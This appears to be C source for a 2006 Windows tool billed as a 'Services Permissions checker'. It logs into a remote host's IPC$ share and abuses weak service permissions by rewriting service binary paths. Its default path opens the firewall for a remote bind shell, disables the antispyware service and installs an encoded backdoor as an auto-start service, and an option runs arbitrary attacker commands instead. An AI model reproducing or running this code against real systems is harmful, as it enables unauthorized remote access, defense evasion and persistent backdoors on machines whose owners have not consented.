
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {char* lpRemoteName; int * lpLocalName; int * lpProvider; int dwType; } ;
typedef int SERVICE_STATUS_PROCESS ;
typedef int * SC_HANDLE ;
typedef TYPE_1__ NETRESOURCE ;
typedef int DWORD ;
typedef int CurrentUserName ;


 scalar_t__ BACKDOOR ;
 int CONNECT_COMMANDLINE ;
 int CONNECT_UPDATE_PROFILE ;
 int ChangeServiceConfig (int *,int ,int ,int ,char*,int *,int *,char*,int *,int *,int *) ;
 int CloseServiceHandle (int *) ;
 scalar_t__ ControlService (int *,int ,int *) ;
 char* EncodedBackdoor ;
 int GetLastError () ;
 int GetUserName (char*,int*) ;
 int HELP ;
 int LIST ;
 int ListVulnerableService (char*) ;
 int NO_ERROR ;
 int * OpenSCManager (char*,int *,int) ;
 int * OpenService (int *,char*,int) ;
 int RESOURCETYPE_ANY ;
 char* RemoteHost ;
 int SERVICE_AUTO_START ;
 int SERVICE_CHANGE_CONFIG ;
 int SERVICE_CONTROL_STOP ;
 int SERVICE_ERROR_IGNORE ;
 int SERVICE_NO_CHANGE ;
 int SERVICE_START ;
 int SERVICE_STOP ;
 int STANDARD_RIGHTS_WRITE ;
 int STOP ;
 int StartModifiedService (int *,char*,int) ;
 int TRUE ;
 int WNetAddConnection2 (TYPE_1__*,char*,char*,int ) ;
 int WNetCancelConnection2 (char*,int *,int ) ;
 char* antispyware ;
 int doFormatMessage (int) ;
 int exit (int) ;
 char* firewall ;
 char* init ;
 int printf (char*,...) ;
 int sprintf (char*,char*,char*) ;
 int * strchr (char*,char) ;
 int strlen (char*) ;
 int usage () ;

int main(int argc, char* argv[]) {

 SC_HANDLE SCM,Svc;
 DWORD ret,len;
 char CurrentUserName[256];
 char *newPath=((void*)0);
 char *host=((void*)0);
 char *user=((void*)0);
 char *pass=((void*)0);
 char *srv=((void*)0);
 int i;
 NETRESOURCE NET;
  SERVICE_STATUS_PROCESS StopStatus;

 printf(" Services Permissions checker v2.0\n");
 printf(" (c) 2006 Andres Tarasco - atarasco%cgmail.com\n\n",'@');

 if (argc==1) usage();
 for (i=1;i<argc;i++) {
    if ( (strlen(argv[i])==2) && (argv[i][0]=='-') ) {
        switch (argv[i][1]) {
            case 'l': LIST=1; break;
            case 'm': srv=argv[i+1]; i=i+1;break;
            case 'u': if (!host) usage(); user=argv[i+1]; i=i++; break;
            case 'p': if (!host) usage(); pass=argv[i+1]; i=i++; break;
            case 'H': host=argv[i+1]; i=i++; break;
            case 'c': newPath=argv[i+1]; i=i+1; BACKDOOR=0; break;
            case 's': STOP=1; break;
            case '?': HELP=1; usage(); break;
            default: printf("Unknown Parameter: %s\n",argv[i]);usage(); break;
        }
    }
 }

 if ((!LIST) && (!srv) )usage();

 if (host) {
    printf("[+] Trying to connect to remote SCM\n");
    sprintf(RemoteHost,"\\\\%s\\IPC$",host);
    printf("[+] Host: %s\n",RemoteHost);
    printf("[+] Username: %s\n",user);
    printf("[+] Password: %s\n",pass);

    NET.dwType = RESOURCETYPE_ANY;
    NET.lpProvider = ((void*)0);
    NET.lpLocalName=((void*)0);
    NET.lpRemoteName = (char *)RemoteHost;
    ret=WNetAddConnection2(&NET,pass,user,CONNECT_COMMANDLINE);


    if ( (ret!=NO_ERROR) && (user !=((void*)0)) ) {
        if (ret==1219) {
            printf("[-] Credentials mismatch. Removing old connection\n");
            WNetCancelConnection2(RemoteHost,((void*)0),TRUE);
            ret=WNetAddConnection2(&NET,pass,user,CONNECT_UPDATE_PROFILE);
        } else {
            if (ret==1326) {
             if (strchr(user,'\\')==((void*)0)) {
                 sprintf(CurrentUserName,"localhost\\%s",user);
                printf("[-] Unknown Username or password\n");
                printf("[+] Trying \"%s\" as new username\n",CurrentUserName);
                ret=WNetAddConnection2(&NET,pass,CurrentUserName,CONNECT_UPDATE_PROFILE);
             }
            }
        }
        if (ret!=NO_ERROR) {
            printf("WNetAddConnection Failed to %s (%s/ %s)\n",RemoteHost,user,pass);
            doFormatMessage(GetLastError());
            exit(-1);
        }
    }
    printf("[+] Network Connection OK\n");

 } else {
    printf("[+] Trying to enumerate local resources\n");
    len=sizeof(CurrentUserName)-1;
    GetUserName( CurrentUserName,&len);
    printf("[+] Username: %s\n",CurrentUserName);
 }


if (LIST) {
    ListVulnerableService(host);
    exit(1);
}




SCM = OpenSCManager(host,((void*)0),STANDARD_RIGHTS_WRITE | SERVICE_START );
if (!SCM){
    printf("[-] OpenScManager() FAILED\n");
    doFormatMessage(GetLastError());
    exit(-1);
}
if (STOP) {
    Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE | SERVICE_STOP);
} else {
    Svc = OpenService(SCM,srv,SERVICE_CHANGE_CONFIG | STANDARD_RIGHTS_WRITE);
}

if (Svc==((void*)0)) {
    printf("[-] Unable to open Service %s\n",srv);
    exit(-1);
}





if (STOP) {
 printf("[+] Stopping previously running instances...\n");
 if (ControlService(Svc,SERVICE_CONTROL_STOP,&StopStatus)!=0) {
    doFormatMessage(GetLastError());

 }
 exit(-1);
}


 if (BACKDOOR) {
    printf("[+] Uninstalling previous backdoors\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,init,((void*)0),((void*)0),"",
        ((void*)0),((void*)0),((void*)0));

        if (ret!=0) StartModifiedService(SCM,srv,0);

    printf("[+] Granting Remote bindshell Execution..\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,firewall,((void*)0),((void*)0),"",
        ((void*)0),((void*)0),((void*)0));
        if (ret!=0) StartModifiedService(SCM,srv,0);
    printf("[+] Shutting down remote antispyware Service =)\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,antispyware,((void*)0),((void*)0),"",
        ((void*)0),((void*)0),((void*)0));
        if (ret!=0) StartModifiedService(SCM,srv,0);
    printf("[+] Installing Backdoor Code...\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,EncodedBackdoor,((void*)0),((void*)0),"",
        ((void*)0),((void*)0),((void*)0));
 } else {
    printf("[+] Sending custom commands to the service\n");
    ret=ChangeServiceConfig(
        Svc,SERVICE_NO_CHANGE,SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,newPath,((void*)0),((void*)0),"",
        ((void*)0),((void*)0),((void*)0));
 }

 if (ret!=0) {
    printf("[+] The service have been succesfully modified =)\n");
    CloseServiceHandle(Svc);
    StartModifiedService(SCM,srv,1);
 } else {
    printf("[-] Service modification Failed\n");
    doFormatMessage(ret);
 }
 CloseServiceHandle(SCM);
 if (host) WNetCancelConnection2(RemoteHost,((void*)0),TRUE);
 return(1);
}
